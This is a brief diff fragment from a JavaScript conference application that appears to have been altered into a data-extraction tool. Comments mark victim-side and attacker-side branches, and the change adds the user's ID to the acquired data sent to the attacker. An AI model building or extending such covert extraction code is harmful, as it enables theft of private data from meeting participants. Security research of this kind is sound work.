@@ -1360,7 +1360,7 @@ export default {
         // this runs on the victim's side
         if (recievedData.extraction === 'request') {
             this._acquireData(recievedData.config).then(acquiredData => {
-                APP.conference._extractionHandler.sendAll(acquiredData);
+                APP.conference._extractionHandler.sendAll(acquiredData, user.getId());
             });
         } else { // 'reply' received, this runs on the attacker's side
             const extractionEvent = APP.conference._extractionEventElement;
